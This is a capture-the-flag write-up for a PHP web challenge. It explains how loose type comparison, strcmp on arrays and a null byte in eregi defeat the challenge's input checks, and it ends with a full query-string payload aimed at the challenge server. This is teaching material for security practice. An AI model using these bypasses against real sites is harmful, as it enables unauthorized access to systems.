<h1>Web - 150</h1>
<p>Given an php file. It seems we have to bypass all strange rules. (web09.php)</p>
<p>1. Numeric problem. (It requires input no a number, but bigger than 2016)<br/>
2018%20 can bypass the checking.<br/>
"bar1":"2018%20"
</p>

```php
is_numeric(@$a["bar1"])?die("nope"):NULL;
if(@$a["bar1"]){
	($a["bar1"]>2016)?$v1=1:NULL;
}
```

<p>2.Value in json array. But cannot find by foreach<br/>
It can use php type juggling to bypass. It is because when string compare with integer, string will type casting to integer. (intval('nudt') == 0). So, only need to change one of the value to 0.<br/>
"bar2":[[1],1,2,0,1]
</p>

```php
	if(is_array(@$a["bar2"])){
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        $pos = array_search("nudt", $a["bar2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;

    }	
```

<p>3. String compare with array in strcmp will be null. And %00 can interrput eregi.</p>

```php
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
		eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
		strpos(($c[0].$d), "isccctf2017")?$v3=1:NULL;
	}
}
```

<p>So, finally payload is http://139.129.108.53:8083/web-09/index.php?iscc={%22bar1%22:%222018%20%22,%22bar2%22:[[1],1,2,0,1]}&cat=0001&cat[0]=00isccctf2017&cat[1][]&dog=%00</p>
